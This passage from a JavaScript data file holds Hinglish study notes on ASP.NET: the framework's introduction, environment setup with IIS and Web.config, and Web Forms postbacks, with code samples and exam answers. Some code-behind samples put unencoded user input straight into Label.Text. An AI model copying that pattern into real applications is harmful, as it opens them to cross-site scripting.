// ============================================================
// WEB TECHNOLOGY — Unit IV, topics 4.1 to 4.14 (ASP.NET)
//  4.1  Introduction to ASP.NET
//  4.2  ASP.NET Environment Setup
//  4.3  ASP.NET Web Forms
//  4.4  ASP.NET Page Life Cycle
//  4.5  Types of ASP.NET Server Controls
//  4.6  State Management — Introduction
//  4.7  View State
//  4.8  Session State and Application State
//  4.9  Cookies and Query Strings
// 4.10  Server Transfer and Response Redirect
// 4.11  Introduction to ADO.NET
// 4.12  Database Connectivity
// 4.13  Validation Controls
// 4.14  Basic Security Concepts
//
// Output panels use section.php (rendered output) + outputHint/outputNote.
// ============================================================

export const webTechnologyTopicsK = [
  {
    "id": "aspnet-intro",
    "number": "4.1",
    "title": "Introduction to ASP.NET",
    "subtitle": "ASP se ASP.NET tak — CLR, server controls aur event-driven web pages",
    "icon": "globe",
    "accent": "#00d4ff",
    "englishDefinition": "ASP.NET is Microsoft's server-side web application framework, first released with the .NET Framework 1.0 in January 2002, used to build dynamic web pages and web services. Unlike classic ASP (Active Server Pages, 1996), where VB script was interpreted line by line inside an .asp file, an ASP.NET page is a compiled .aspx page whose code-behind file (C# or VB.NET) is compiled into an assembly and executed by the Common Language Runtime (CLR) under the Common Intermediate Language and just-in-time compilation. ASP.NET provides an event-driven programming model (server controls raise events such as Click, and postbacks carry them to the server), a rich set of server controls that render themselves as HTML, built-in state management (view state, session and application state, cookies), authentication and authorization providers, data access through ADO.NET, and configuration through Web.config. The framework family includes Web Forms, MVC (2009), Web API and later ASP.NET Core (2016, cross-platform); the older Web Forms model remains the classic 'ASP.NET' used in MCA syllabi, running on Windows with IIS or IIS Express.",
    "intro": "Classic ASP (1996) mein HTML ke beech VBScript likha jaata tha aur browser ko response bhejne se pehle wo script line-by-line interpret hoti thi — bada code spaghetti ban jaata tha. **ASP.NET** ne model badal diya: page **compile** hota hai, code-behind file mein clean C#/VB code hota hai, aur CLR use chalata hai. Isliye speed, debugging, security aur state management sab behtar. Exam ke liye teen cheezein pakki karo: **ASP vs ASP.NET**, **.NET Framework ke components (CLR, FCL, CTS, CLS, MSIL, JIT)** aur **ASP.NET ke features (server controls, postback, state management, Web.config)**.",
    "sections": [
      {
        "type": "definition",
        "title": "ASP.NET kya hai",
        "kicker": "Definition",
        "body": "ASP.NET Microsoft ka **server-side web application framework** hai jo dynamic web pages, web applications aur web services banane ke liye use hota hai. Ye .NET Framework ka hissa hai (2002 mein .NET 1.0 ke saath aaya) aur **compiled** hai: .aspx page aur uska code-behind (C# ya VB.NET) assembly mein compile hote hain, phir **CLR** use run karta hai.",
        "body2": "Browser ko sirf plain HTML milta hai — page par likha C# code server par chalta hai. Isi liye ASP.NET code **server-side** hai: user source code dekh nahi sakta, sirf output dekhta hai.",
        "chips": [
          "Server-side",
          "Compiled",
          "CLR + .NET Framework",
          "Event-driven",
          "Web Forms"
        ]
      },
      {
        "type": "cards",
        "title": "ASP.NET ke features",
        "kicker": "Key Points",
        "cards": [
          {
            "icon": "layers",
            "title": "Compiled + CLR",
            "body": "Har page pehle compile hota hai, phir CLR chalata hai — interpreted ASP se tez; strong typing aur debugging milti hai."
          },
          {
            "icon": "users",
            "title": "Event-driven model",
            "body": "Server controls events raise karte hain (Button_Click); postback par wahi event server par chalta hai — Windows forms jaisa programming."
          },
          {
            "icon": "target",
            "title": "Server controls",
            "body": "TextBox, GridView, Validator jaise controls HTML render karte hain — developer ko HTML/JS manually likhna nahi padta."
          },
          {
            "icon": "database",
            "title": "State management",
            "body": "View State, Session, Application, Cookies, Query String — HTTP ke stateless nature ka solution."
          },
          {
            "icon": "shield",
            "title": "Security",
            "body": "Forms / Windows authentication, authorization, validation controls, ViewState MAC, HTTPS support built-in."
          },
          {
            "icon": "file",
            "title": "Web.config + deployment",
            "body": "XML configuration (connection strings, session mode, auth, errors) — code change ke bina settings badlo; XCOPY ya IIS publish se deploy."
          }
        ]
      },
      {
        "type": "comparison",
        "title": "ASP vs ASP.NET",
        "kicker": "Comparison",
        "columns": [
          "Classic ASP",
          "ASP.NET"
        ],
        "rows": [
          {
            "label": "Kya hai",
            "values": [
              "Active Server Pages (1996)",
              ".NET web framework (2002)"
            ]
          },
          {
            "label": "Execution",
            "values": [
              "interpreted (line by line)",
              "compiled (assembly + JIT)"
            ]
          },
          {
            "label": "Language",
            "values": [
              "VBScript / JScript",
              "C#, VB.NET, J#, F#"
            ]
          },
          {
            "label": "Code model",
            "values": [
              "inline, HTML ke beech",
              "code-behind + server controls"
            ]
          },
          {
            "label": "State",
            "values": [
              "sirf session/cookies",
              "view state, session, app, cache"
            ]
          },
          {
            "label": "Server",
            "values": [
              "IIS + ASP DLL",
              "IIS + CLR (IIS Express for dev)"
            ]
          },
          {
            "label": "Speed",
            "values": [
              "slow (roz script parse)",
              "fast (compiled, cached)"
            ]
          }
        ],
        "columnColors": [
          "#ff7a90",
          "#00d4ff"
        ]
      },
      {
        "type": "points",
        "title": ".NET Framework ke components",
        "kicker": "Architecture",
        "points": [
          "**CLR (Common Language Runtime):** execution engine — memory management (garbage collector), type safety, exception handling, JIT compilation, thread management. Ye C# ko chalata hai.",
          "**FCL (Framework Class Library):** hazaaron ready classes — System.Web (ASP.NET), System.Data (ADO.NET), System.IO, System.XML, System.Security.",
          "**CTS (Common Type System):** sabhi .NET languages ke data types ka ek hi standard (int, string, object) — VB.NET ka integer aur C# ka int same.",
          "**CLS (Common Language Specification):** rules ka set jisse ek language mein likha class doosri language use kar sake.",
          "**MSIL / CIL:** compile hone par code **Intermediate Language** banta hai, JIT use machine code mein convert karta hai — isliye .NET 'managed code' hai.",
          "**Assembly:** deployment ka unit (.exe ya .dll), metadata + IL; **GAC** (Global Assembly Cache) mein shared assemblies rehti hain."
        ]
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Pehla ASP.NET page — Hello",
        "code": "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" CodeBehind=\"Default.aspx.cs\"\n    Inherits=\"HelloApp.Default\" %>\n\n<!DOCTYPE html>\n<html>\n<head runat=\"server\">\n    <title>Hello ASP.NET</title>\n</head>\n<body>\n    <form id=\"form1\" runat=\"server\">\n        <h2>Hello ASP.NET</h2>\n        <asp:Label ID=\"lblMsg\" runat=\"server\" Font-Bold=\"true\" />\n        <br /><br />\n        <asp:TextBox ID=\"txtName\" runat=\"server\" />\n        <asp:Button ID=\"btnGo\" runat=\"server\" Text=\"Greet\"\n                    OnClick=\"btnGo_Click\" />\n    </form>\n</body>\n</html>",
        "language": "aspx",
        "filename": "Default.aspx",
        "php": "Hello ASP.NET\n\n[ Name type karo ]  [ Greet ]\n\nHello Priya, welcome to ASP.NET\nToday: 05-11-2026 10:42",
        "label": "Rendered output",
        "height": 250,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "Do file milti hain: mark-up wali .aspx aur logic wali .aspx.cs. Neeche code-behind hai jo button click par label bhar deta hai.",
        "note": "<form runat=\"server\"> hi postback ka base hai — iske bina server controls events nahi bhej sakte."
      },
      {
        "type": "code",
        "title": "Code-behind (C#)",
        "kicker": "Code",
        "code": "using System;\n\nnamespace HelloApp\n{\n    public partial class Default : System.Web.UI.Page\n    {\n        protected void Page_Load(object sender, EventArgs e)\n        {\n            if (!IsPostBack)\n                lblMsg.Text = \"Type your name and click Greet.\";\n        }\n\n        protected void btnGo_Click(object sender, EventArgs e)\n        {\n            string name = txtName.Text.Trim();\n            lblMsg.Text = \"Hello \" + name + \", welcome to ASP.NET<br />\" +\n                          \"Today: \" + DateTime.Now.ToString(\"dd-MM-yyyy HH:mm\");\n        }\n    }\n}",
        "language": "csharp",
        "filename": "Default.aspx.cs",
        "intro": "Page_Load har request par chalta hai, click handler sirf postback par — isliye IsPostBack check zaroori hai.",
        "note": "IsPostBack = false pehli request par, true jab page apne aap ko server par wapas bhejta hai (button click)."
      },
      {
        "type": "diagram",
        "title": "ASP.NET Request Flow",
        "kicker": "Diagram",
        "diagram": "wt4-intro",
        "caption": "Browser → IIS → ASP.NET worker → compile + CLR + page lifecycle → HTML response"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**ASP.NET:** Microsoft ka compiled server-side web framework (.NET Framework, 2002 se).",
          "**ASP vs ASP.NET:** interpreted vs compiled; VBScript inline vs C# code-behind + server controls.",
          "**.NET components:** CLR (execution), FCL (libraries), CTS (type system), CLS (language rules), MSIL + JIT, assembly/GAC.",
          "**Features:** event-driven server controls, postback, state management, validation, auth, Web.config.",
          "**Files:** .aspx (mark-up) + .aspx.cs (code-behind) + Web.config + Global.asax.",
          "**Family:** Web Forms, MVC (2009), Web API, ASP.NET Core (2016, cross-platform)."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "What is ASP.NET? Explain its features and differentiate it from classic ASP.",
        "answer": "**ASP.NET** Microsoft ka **server-side web application framework** hai jo dynamic websites, web applications aur web services banane ke liye use hota hai. Ye .NET Framework ka part hai (2002, .NET 1.0 ke saath) aur **compiled** model par chalta hai: .aspx page + code-behind (C#/VB.NET) assembly mein compile hote hain, CLR unhe JIT ke through chalata hai.\n\n**Features:**\n1. **Compiled code + CLR** — interpreted ASP se tez, type-safe, garbage collection.\n2. **Event-driven programming** — Button_Click jaise events, postback se server par pahunchen.\n3. **Server controls** — TextBox, GridView, Validators ; ye khud HTML render karte hain.\n4. **State management** — View State, Session, Application, Cookies, Query String.\n5. **Validation controls** — client + server side validation built-in.\n6. **Security** — Forms/Windows authentication, authorization, ViewState MAC, HTTPS.\n7. **Data access** — ADO.NET (SqlConnection, DataReader, DataSet, GridView binding).\n8. **Configuration** — Web.config se connection string, session mode, errors, auth control.\n9. **Multiple languages** — C#, VB.NET, J# ; CTS/CLS ki wajah se interop.\n10. **Master pages, themes, user controls** — reusable UI.\n\n**ASP vs ASP.NET:**\n\n| Basis | Classic ASP | ASP.NET |\n|---|---|---|\n| Execution | interpreted | compiled (MSIL + JIT) |\n| Language | VBScript | C#, VB.NET |\n| Code model | inline with HTML | code-behind + server controls |\n| State | session/cookies | view state, session, application, cache |\n| Speed | slow | fast (compiled, cached) |\n| Debugging | weak | Visual Studio debugger |\n\n**Diagram:** Refer to the ASP.NET Request Flow diagram."
      },
      {
        "question": "Explain the components of the .NET Framework. What is the role of the CLR?",
        "answer": ".NET Framework do bade hisson se banta hai: **CLR** (runtime) aur **FCL** (class library).\n\n**1. CLR (Common Language Runtime)** — execution engine:\n- **JIT compilation** — MSIL ko machine code mein badalta hai.\n- **Garbage collection** — memory automatically free.\n- **Type safety aur exception handling** — galat cast/overflow par exception.\n- **Thread management aur security** — managed execution.\nIsliye .NET code ko **managed code** kehte hain.\n\n**2. FCL (Framework Class Library)** — ready-made classes: System.Web (ASP.NET), System.Data (ADO.NET), System.IO, System.Xml, System.Security, System.Collections.\n\n**3. CTS (Common Type System)** — sab languages ke types ka common standard (int, string, object) — isliye VB.NET ka class C# mein use ho sakta hai.\n\n**4. CLS (Common Language Specification)** — rules ka set jo cross-language compatibility deta hai.\n\n**5. MSIL / CIL** — compilation ke pehle step ka intermediate code; CPU-independent.\n\n**6. Assembly** — .exe/.dll (IL + metadata + manifest); **GAC** mein shared assemblies.\n\n**Compilation flow:** source code (C#) → compiler (csc) → **MSIL + metadata** → assembly → runtime par **JIT** → machine code → CPU.\n\n**Web ke liye:** IIS request ko `aspnet_isapi.dll` (ya integrated pipeline) ke through CLR ko deta hai; CLR page class load karke lifecycle chalata hai aur HTML return karta hai.\n\n**Diagram:** Refer to the ASP.NET Request Flow diagram."
      },
      {
        "question": "Explain the ASP.NET request-processing flow from browser to response.",
        "answer": "Ek ASP.NET request ke steps:\n\n1. **Browser** HTTP request bhejta hai (GET /Default.aspx).\n2. **IIS** request receive karta hai; static file (jpg/css) ho to seedha return.\n3. **Routing/Handler mapping** — .aspx request ASP.NET handler ko di jaati hai (integrated pipeline mein `System.Web.UI.PageHandlerFactory`).\n4. **ASP.NET worker process (w3wp.exe)** + **application domain** — application load hota hai, `Application_Start` (Global.asax) pehli baar chalta hai.\n5. **Compilation** — page pehli baar aaya to C#/VB code compile hoke assembly banti hai (baad mein cached).\n6. **Page object + lifecycle** — PreInit → Init → Load → control events (postback) → PreRender → Render → Unload.\n7. **State restoration** — ViewState (hidden field) decode hoke controls mein bhar jaata hai; Session/Cookies bhi padhe jaate hain.\n8. **HTML render** — server controls HTML output dete hain; response ke saath ViewState hidden field.\n9. **Response browser ko** — browser sirf HTML/CSS/JS dekhta hai, C# code kabhi nahi.\n\n**IsPostBack** isi flow ka signal hai: ViewState + post data aaye to true (button click), warna false (pehli visit).\n\n**Diagram:** Refer to the ASP.NET Request Flow diagram."
      }
    ]
  },
  {
    "id": "aspnet-setup",
    "number": "4.2",
    "title": "ASP.NET Environment Setup",
    "subtitle": "IIS, Visual Studio, Web.config aur project ka folder structure",
    "icon": "server",
    "accent": "#00ff88",
    "englishDefinition": "Setting up an ASP.NET environment means installing the runtime that executes pages and the tooling that builds them. On Windows the runtime is the .NET Framework (4.8 is the last version) with Internet Information Services (IIS) as the web server; Visual Studio (Community, Professional or Enterprise) provides the editor, debugger and templates, and IIS Express is installed with it as a lightweight development server that runs on a random localhost port (usually 44300 or above). A classic Web Forms project is created from the 'ASP.NET Web Application (.NET Framework) - Web Forms' template and contains Default.aspx and its code-behind, the Site.master master page, Web.config for configuration, Global.asax for application-level events, and the special folders App_Data, App_Code, App_Themes, App_GlobalResources, Bin, Content and Scripts. Running the project (F5) compiles it on the fly and opens the page in a browser; Web.config controls compilation debugging, connection strings, session mode, authentication and custom errors. Deployment moves the published output to a real IIS application pool, either by publishing (Web Deploy) or by XCOPY/ftp upload.",
    "intro": "ASP.NET chalane ke liye do cheezein chahiye: **runtime** (.NET Framework + IIS) aur **tool** (Visual Studio). VS install karte hi **IIS Express** aa jaata hai — development ke liye chhota server jo random port par chalta hai (jaise http://localhost:44300). Project banate hi jo files milti hain (.aspx, .aspx.cs, Web.config, Global.asax, App_Data) — exam mein aksar 'project structure' ya 'Web.config ka role' poochha jaata hai.",
    "sections": [
      {
        "type": "definition",
        "title": "Environment setup kya hai",
        "kicker": "Definition",
        "body": "ASP.NET environment setup ka matlab hai **runtime + web server + development tool** install aur configure karna, taaki .aspx pages compile ho kar browser mein chal sakein.",
        "body2": "Minimum requirements (classic Web Forms): **Windows** (7/10/11 ya Server), **.NET Framework 4.x**, **IIS 10** (ya IIS Express), **Visual Studio 2019/2022** (Community free), aur ek browser. Modern .NET (Core) cross-platform hai par Web Forms sirf .NET Framework par chalta hai.",
        "chips": [
          "Windows",
          ".NET Framework 4.8",
          "IIS / IIS Express",
          "Visual Studio",
          "Web.config"
        ]
      },
      {
        "type": "points",
        "title": "Setup ke steps",
        "kicker": "Steps",
        "points": [
          "**Step 1 — .NET Framework install:** Windows Features mein **Internet Information Services** aur **ASP.NET 4.x** enable karo (ya VS installer se 'ASP.NET and web development' workload).",
          "**Step 2 — IIS verify:** browser mein `http://localhost` kholo; IIS ka welcome page aaye to server ready hai. IIS Manager se **Application Pool** (.NET CLR v4.0, Integrated) banta hai.",
          "**Step 3 — Visual Studio install:** workload **ASP.NET and web development** chuno; iske saath **IIS Express** aur SQL Server Express bhi aa jaate hain.",
          "**Step 4 — Project banao:** New Project → **ASP.NET Web Application (.NET Framework)** → template **Web Forms** → Create.",
          "**Step 5 — Run:** F5 (debug) ya Ctrl+F5 (without debug); IIS Express random port par site chala deta hai.",
          "**Step 6 — Configure:** Web.config mein connection string, `debug='true'`, session mode, authentication set karo.",
          "**Step 7 — Deploy:** Build → Publish (Web Deploy / File System) → IIS site + app pool par copy; `Bin` folder ki DLLs saath jaati hain."
        ]
      },
      {
        "type": "comparison",
        "title": "IIS Express vs Full IIS",
        "kicker": "Comparison",
        "columns": [
          "IIS Express",
          "Full IIS"
        ],
        "rows": [
          {
            "label": "Kis ke liye",
            "values": [
              "development (VS)",
              "production / testing server"
            ]
          },
          {
            "label": "Port",
            "values": [
              "random (44300+)",
              "80 / 443"
            ]
          },
          {
            "label": "Config",
            "values": [
              "applicationhost.config",
              "applicationHost.config + app pools"
            ]
          },
          {
            "label": "Start",
            "values": [
              "VS se F5 / tray icon",
              "Windows service (W3SVC)"
            ]
          },
          {
            "label": "Features",
            "values": [
              "limited (no FTP, no site mgmt)",
              "full (bindings, SSL, logging)"
            ]
          },
          {
            "label": "Users",
            "values": [
              "ek developer",
              "sabhi clients"
            ]
          }
        ],
        "columnColors": [
          "#00d4ff",
          "#00ff88"
        ]
      },
      {
        "type": "code",
        "title": "Web.config — main settings",
        "kicker": "Code",
        "code": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n  <connectionStrings>\n    <add name=\"CollegeDB\"\n         connectionString=\"Data Source=.;Initial Catalog=College;\n                           Integrated Security=True\"\n         providerName=\"System.Data.SqlClient\" />\n  </connectionStrings>\n\n  <appSettings>\n    <add key=\"SiteName\" value=\"MCA Notes\" />\n  </appSettings>\n\n  <system.web>\n    <compilation debug=\"true\" targetFramework=\"4.8\" />\n    <sessionState mode=\"InProc\" timeout=\"20\" />\n    <authentication mode=\"Forms\">\n      <forms loginUrl=\"Login.aspx\" timeout=\"30\" />\n    </authentication>\n    <customErrors mode=\"RemoteOnly\" defaultRedirect=\"Error.aspx\" />\n    <httpRuntime targetFramework=\"4.8\" />\n  </system.web>\n</configuration>",
        "language": "xml",
        "filename": "Web.config",
        "intro": "Web.config XML file hai — koi bhi setting change karne ke liye code rebuild nahi karna padta (app pool recycle hota hai).",
        "note": "debug=\"true\" sirf development mein; production mein customErrors On aur debug false rakho."
      },
      {
        "type": "points",
        "title": "Project ka folder structure",
        "kicker": "Files",
        "points": [
          "**Default.aspx + Default.aspx.cs + .designer.cs** — page mark-up, code-behind, designer-generated control fields.",
          "**Site.master** — master page (common header/footer/nav) jo content pages use karte hain.",
          "**Web.config** — configuration; **Global.asax** — Application_Start/End, Session_Start/End, error handlers.",
          "**App_Data** — database (.mdf) aur local data files; ye folder browser se access nahi hota.",
          "**App_Code** — shared classes (.cs) jo auto-compile hoti hain; **Bin** — compiled DLLs (referenced assemblies).",
          "**Content / Scripts / App_Themes / App_GlobalResources** — CSS, JS, themes aur resx resources.",
          "**Properties/AssemblyInfo.cs** + **packages.config** — assembly metadata aur NuGet packages."
        ]
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Default.aspx par configuration read karna",
        "code": "using System.Configuration;\n\npublic partial class Default : System.Web.UI.Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        lblSite.Text = ConfigurationManager.AppSettings[\"SiteName\"];\n        lblFramework.Text = \".NET \" + System.Environment.Version;\n\n        string cs = ConfigurationManager\n                    .ConnectionStrings[\"CollegeDB\"].ConnectionString;\n        lblDb.Text = cs.Contains(\"College\") ? \"DB configured\" : \"check Web.config\";\n    }\n}",
        "language": "csharp",
        "filename": "Default.aspx.cs",
        "php": "MCA Notes\n.NET 4.8.9310.0\nDB configured",
        "label": "Rendered output",
        "height": 210,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "ConfigurationManager se Web.config ki values padhi jaati hain — connection string ko code mein hard-code karna galat practice hai."
      },
      {
        "type": "diagram",
        "title": "ASP.NET Setup Stack",
        "kicker": "Diagram",
        "diagram": "wt4-setup",
        "caption": "Windows → IIS → .NET Framework → application pool → site; Visual Studio + IIS Express dev ke liye"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**Requirements:** Windows + .NET Framework 4.8 + IIS/IIS Express + Visual Studio.",
          "**Dev server:** IIS Express (random port 44300+), F5 se start, applicationhost.config.",
          "**Production:** full IIS + application pool (.NET CLR v4.0, Integrated pipeline).",
          "**Project files:** .aspx, .aspx.cs, Site.master, Web.config, Global.asax, App_Data, Bin.",
          "**Web.config:** connectionStrings, appSettings, sessionState, authentication, customErrors, compilation debug.",
          "**Deploy:** Publish (Web Deploy / File System) ya XCOPY + app pool; Bin DLLs zaroori."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "Explain the steps to set up an ASP.NET development environment and run your first page.",
        "answer": "**Requirements:** Windows OS, **.NET Framework 4.8**, **IIS / IIS Express**, **Visual Studio 2019/2022** (Community), browser.\n\n**Steps:**\n1. **Enable IIS + ASP.NET:** Control Panel → Programs → Turn Windows features on/off → *Internet Information Services* + *.NET Framework 4.x (ASP.NET)* tick karo. IIS Manager kholo aur `http://localhost` par welcome page verify karo.\n2. **Install Visual Studio:** installer se workload **\"ASP.NET and web development\"** chuno — iske saath IIS Express aur related SDKs aa jaate hain.\n3. **Project create:** File → New → Project → **ASP.NET Web Application (.NET Framework)** → template **Web Forms** → naam/path → Create. Visual Studio `Default.aspx`, `Default.aspx.cs`, `Web.config`, `Global.asax`, `Site.master` bana deta hai.\n4. **Code likho:** .aspx mein mark-up aur server controls, code-behind mein event handlers.\n5. **Run:** **F5** (debugging ke saath) ya **Ctrl+F5**. IIS Express random port par site host karta hai (jaise `http://localhost:44300/Default.aspx`).\n6. **Configure:** `Web.config` mein connection string, `debug`, `sessionState`, `authentication` set karo.\n7. **Test:** Browser mein page open karo; button click par postback aur ViewState test karo.\n8. **Deploy:** Build → **Publish** (Web Deploy / File System) → IIS par site + **application pool** (.NET CLR v4.0, Integrated) banakar published folder point karo.\n\n**Result:** browser ko sirf HTML milta hai; compilation, C# execution aur state management server par hote hain.\n\n**Diagram:** Refer to the ASP.NET Setup Stack diagram."
      },
      {
        "question": "Explain the structure of an ASP.NET Web Forms project and the role of Web.config.",
        "answer": "**Project structure (Web Forms):**\n\n| File / folder | Kya karta hai |\n|---|---|\n| Default.aspx | page ka HTML + server controls |\n| Default.aspx.cs | code-behind (C#), event handlers, Page_Load |\n| Default.aspx.designer.cs | Visual Studio generated control fields |\n| Site.master | master page (header, footer, nav) |\n| Web.config | poori application ki configuration |\n| Global.asax | Application_Start/End, Session_Start/End |\n| App_Data | local database (.mdf), browser se protected |\n| App_Code | shared .cs classes (auto-compiled) |\n| Bin | compiled DLLs / referenced assemblies |\n| Content, Scripts, App_Themes | CSS, JS, themes/skins |\n\n**Web.config ka role (XML, root mein):**\n- **connectionStrings** — database connection string centrally (code mein hard-code nahi).\n- **appSettings** — site name, e-mail settings jaise key-value.\n- **system.web → compilation** — `debug`, targetFramework.\n- **sessionState** — `mode` (InProc/StateServer/SQLServer), `timeout`.\n- **authentication / authorization** — Forms/Windows mode, allowed/denied users.\n- **customErrors** — error page aur detail hiding (production security).\n- **httpRuntime, pages, httpHandlers** — runtime behaviour, themes, ViewState settings.\n\n**Kyun important:** config change ke liye recompilation nahi chahiye (app pool recycle hota hai), environment-wise (dev/test/prod) transform ho sakti hai, aur security settings ek jagah control hoti hain.\n\n**Diagram:** Refer to the ASP.NET Setup Stack diagram."
      },
      {
        "question": "What is IIS? Differentiate between IIS and IIS Express.",
        "answer": "**IIS (Internet Information Services)** Microsoft ka Windows web server hai jo HTTP/HTTPS requests receive karke ASP.NET (ya static files) ko serve karta hai. IIS request ko worker process (**w3wp.exe**) aur **application pool** ke through chalata hai.\n\n**Kya manage karta hai:** sites aur bindings (port/host header), application pools, virtual directories, SSL certificates, authentication (Anonymous/Windows/Forms), logging, compression, URL rewrite.\n\n**IIS Express vs Full IIS:**\n\n| Point | IIS Express | Full IIS |\n|---|---|---|\n| Kis ke liye | developer machine (VS) | production/staging server |\n| Port | random 44300+ | 80 / 443 |\n| Config | `applicationhost.config` (user profile) | `applicationHost.config` + app pools |\n| Start/stop | VS se (F5) ya tray icon | Windows service (W3SVC) 24x7 |\n| Features | core IIS only (no FTP/site management) | full feature set |\n| SSL | self-signed dev certificate | proper certificate |\n| Users | ek developer | multiple clients |\n\n**Application pool:** IIS ka isolation unit — har pool apna worker process rakhta hai, ek app crash ho to doosri app nahi girti; pool ka .NET CLR version (v4.0) aur pipeline mode (**Integrated**) ASP.NET ke liye zaroori hai.\n\n**Dev → prod flow:** VS + IIS Express par development → Publish → IIS site + app pool par deployment (Bin DLLs, Web.config transforms).\n\n**Diagram:** Refer to the ASP.NET Setup Stack diagram."
      }
    ]
  },
  {
    "id": "web-forms",
    "number": "4.3",
    "title": "ASP.NET Web Forms",
    "subtitle": ".aspx + code-behind, postback aur event model",
    "icon": "file",
    "accent": "#ff8800",
    "englishDefinition": "ASP.NET Web Forms is the page-based programming model of ASP.NET in which a web page is a single .aspx file containing HTML mark-up plus server controls, backed by a code-behind class (.aspx.cs in C# or .aspx.vb in VB.NET) that inherits from System.Web.UI.Page. A page directive (@Page Language, AutoEventWireup, CodeBehind, Inherits) binds the two files. Because HTTP is stateless, Web Forms recreates the page on every request and uses a postback - the same page posts back to itself - so that control events (Button.Click, TextBox.TextChanged, DropDownList.SelectedIndexChanged) can be raised on the server and handled in code-behind. Developers check Page.IsPostBack to distinguish the first request from a postback, and state is preserved across postbacks with view state and (optionally) session. Reusability comes from master pages (.master), user controls (.ascx), themes and skins. Web Forms is event-driven and RAD-oriented, in contrast to ASP.NET MVC's controller-and-view model, and its markup renders plain HTML plus the hidden __VIEWSTATE field.",
    "intro": "Web Forms ka idea simple hai: web page ko **Windows form** ki tarah program karo. Aap .aspx mein controls rakhte ho (TextBox, Button), unke events code-behind mein likhte ho — `btnSave_Click`. Problem ye hai ki HTTP **stateless** hai, isliye page har baar naya banta hai. Solution: **postback** (page apne aap ko wapas server par post karta hai) + **ViewState** (controls ki values wapas bharne ke liye). `IsPostBack` batata hai ki ye pehli request hai ya postback.",
    "sections": [
      {
        "type": "definition",
        "title": "Web Forms model",
        "kicker": "Definition",
        "body": "ASP.NET Web Forms ek **page-based, event-driven** model hai: ek web page = `.aspx` file (HTML + server controls) + **code-behind** class (`.aspx.cs`) jo `System.Web.UI.Page` se inherit karti hai. Dono ko `<%@ Page %>` directive jodta hai.",
        "body2": "Event-driven hone ka matlab: developer ko sirf event handler likhna hota hai (`Button1_Click`), baaki — HTML render karna, state bhar lena, validation — framework karta hai. Isi liye Web Forms ko **RAD (Rapid Application Development)** model kehte hain.",
        "chips": [
          ".aspx + code-behind",
          "@Page directive",
          "Postback",
          "IsPostBack",
          "Server controls"
        ]
      },
      {
        "type": "cards",
        "title": "Page ke parts",
        "kicker": "Key Points",
        "cards": [
          {
            "icon": "file",
            "title": "Page directive",
            "body": "`<%@ Page Language='C#' CodeBehind='X.aspx.cs' Inherits='X' %>` — language, code-behind file aur class batata hai."
          },
          {
            "icon": "code",
            "title": "Mark-up + controls",
            "body": ".aspx mein HTML, CSS aur `<asp:...>` server controls; `runat='server'` control ko server-side banata hai."
          },
          {
            "icon": "layers",
            "title": "Code-behind",
            "body": ".aspx.cs mein event handlers, Page_Load, apne helper methods; control fields designer file se aate hain."
          },
          {
            "icon": "cycle",
            "title": "Postback",
            "body": "Same page apne aap ko POST karta hai — click/text change server par event ban ke pahunchta hai."
          },
          {
            "icon": "metrics",
            "title": "IsPostBack",
            "body": "`false` = pehli request, `true` = postback (button click, dropdown change)."
          },
          {
            "icon": "check",
            "title": "State",
            "body": "Postback ke baad values bani rahein — ViewState (per page), Session (per user), Cookies (client)."
          }
        ]
      },
      {
        "type": "code",
        "title": ".aspx page — form aur controls",
        "kicker": "Code",
        "code": "<%@ Page Language=\"C#\" AutoEventWireup=\"true\"\n    CodeBehind=\"Register.aspx.cs\" Inherits=\"WebApp.Register\" %>\n\n<!DOCTYPE html>\n<html>\n<head runat=\"server\"><title>Register</title></head>\n<body>\n  <form id=\"form1\" runat=\"server\">\n    <h2>Student Registration</h2>\n\n    <asp:Label ID=\"lblName\" runat=\"server\" Text=\"Name:\" />\n    <asp:TextBox ID=\"txtName\" runat=\"server\" />\n\n    <asp:Label ID=\"lblEmail\" runat=\"server\" Text=\"Email:\" />\n    <asp:TextBox ID=\"txtEmail\" runat=\"server\" />\n\n    <asp:Button ID=\"btnSave\" runat=\"server\" Text=\"Save\"\n                OnClick=\"btnSave_Click\" />\n\n    <asp:Label ID=\"lblMsg\" runat=\"server\" ForeColor=\"Green\" />\n  </form>\n</body>\n</html>",
        "language": "aspx",
        "filename": "Register.aspx",
        "intro": "Mark-up sirf UI batata hai — Save par kya hoga wo code-behind mein hai.",
        "note": "runat=\"server\" har control ke saath zaroori hai; form tag bhi runat=\"server\" hona chahiye."
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Code-behind aur postback",
        "code": "using System;\n\npublic partial class Register : System.Web.UI.Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        // pehli baar page khula hai\n        if (!IsPostBack)\n        {\n            lblMsg.Text = \"Fill the form and click Save.\";\n        }\n    }\n\n    protected void btnSave_Click(object sender, EventArgs e)\n    {\n        if (txtName.Text == \"\" || txtEmail.Text == \"\")\n        {\n            lblMsg.ForeColor = System.Drawing.Color.Red;\n            lblMsg.Text = \"Name and Email are required!\";\n            return;\n        }\n\n        lblMsg.ForeColor = System.Drawing.Color.Green;\n        lblMsg.Text = \"Saved: \" + txtName.Text + \" (\" + txtEmail.Text + \")\";\n        txtName.Text = \"\";\n        txtEmail.Text = \"\";\n    }\n}",
        "language": "csharp",
        "filename": "Register.aspx.cs",
        "php": "Page load: Fill the form and click Save.\n\n[ Name: Riya ] [ Email: riya@mca.in ]  [ Save ]\n\nSaved: Riya (riya@mca.in)     <-- postback ke baad",
        "label": "Rendered output",
        "height": 240,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "`IsPostBack` check na karo to Page_Load har click par message overwrite kar dega."
      },
      {
        "type": "points",
